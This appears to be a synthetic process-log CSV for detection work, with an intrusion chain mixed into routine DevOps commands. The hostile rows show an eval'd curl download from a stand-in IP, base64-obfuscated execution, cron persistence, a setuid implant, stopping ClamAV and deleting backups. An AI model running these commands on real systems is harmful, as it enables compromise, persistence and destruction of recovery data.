process_name,command_line
bash,"X='curl -fsSL http://198.51.100.207/setup.sh -o /tmp/.X11-unix/s.sh'; eval ""$X"""
apt-get,apt-get install -y python3-pip
bash,cd /home/ec2-user/billing-service && ls
uptime,uptime
git,git pull origin release/2.4
node,node scripts/seed.js
pip3,pip3 install -r requirements.txt
bash,cd /home/ec2-user/web-app && ls
curl,curl -s http://localhost:8080/health
npm,npm ci --no-audit
curl,curl -fsS https://api.github.com/repos/web-app/commits | head
scp,scp report.csv ec2-user@reports:/srv/reports/
git,git pull origin hotfix/login
bash,echo YmFzaCAvdG1wLy5YMTEtdW5peC9zLnNo | base64 -d | bash
docker,docker logs --tail 100 search
kubectl,kubectl logs deploy/auth-svc --tail 50
git,git pull origin main
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head
python3,python3 /opt/app/manage.py migrate
git,git checkout release/2.4
aws,aws s3 ls s3://search-artifacts/
kubectl,kubectl rollout status deploy/nginx
grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src
bash,cd /home/ec2-user/data-pipeline && ls
rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/search/
git,git checkout develop
bash,echo KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gJyovMTAgKiAqICogKiAvdG1wLy5YMTEtdW5peC8udGVsZW1ldHJ5JykgfCBjcm9udGFiIC0= | base64 -d | bash
bash,ls -la /home/ec2-user
journalctl,journalctl -u auth-svc --since '10 min ago'
grep,grep -r 'TODO' /home/ec2-user/mobile-api/src
kubectl,kubectl rollout status deploy/postgres
docker,docker logs --tail 100 redis
go,go build ./...
systemctl,systemctl status worker
htop,htop -d 5
npm,npm test -- --runInBand
bash,sudo install -m4755 /tmp/.X11-unix/.telemetry /usr/local/bin/.telemetry
git,git commit -am 'fix: api-gateway retry logic'
find,find /home/ec2-user/infra -name '*.log' -mtime +7
kubectl,kubectl logs deploy/api-gateway --tail 50
git,git log --oneline -n 10
free,free -m
tar,tar czf /backups/auth-svc-76.tgz /var/lib/auth-svc
curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head
df,df -h
git,git status
docker,docker ps -a
journalctl,journalctl -u postgres --since '10 min ago'
find,find /home/ec2-user/platform -name '*.log' -mtime +7
aws,aws s3 ls s3://worker-artifacts/
docker,docker compose up -d payments
aws,aws s3 ls s3://postgres-artifacts/
kubectl,kubectl logs deploy/postgres --tail 50
systemctl,systemctl stop clamav-daemon
docker,docker logs --tail 100 postgres
ssh,ssh ec2-user@build-39 uptime
python3,python3 -m pytest tests/ -q
systemctl,systemctl status api-gateway
docker,docker build -t worker:94 .
find,find /home/ec2-user/mobile-api -name '*.log' -mtime +7
aws,aws s3 ls s3://api-gateway-artifacts/
make,make lint
psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;'
redis-cli,redis-cli ping
bash,find / -type d -name 'shares' -o -name 'backups' 2>/dev/null
docker,docker build -t api-gateway:29 .
ps,ps aux --sort=-%mem | head
docker,docker compose up -d api-gateway
systemctl,systemctl restart search
kubectl,kubectl get pods -n production
apt-get,apt-get install -y jq
rm,rm -rf /var/backups/* /snapshots/* 2>/dev/null
docker,docker compose up -d auth-svc
docker,docker compose up -d nginx
git,git pull origin feature/checkout
docker,docker logs --tail 100 worker
docker,docker logs --tail 100 api-gateway
bash,cd /home/ec2-user/mobile-api && ls
journalctl,journalctl -u redis --since '10 min ago'
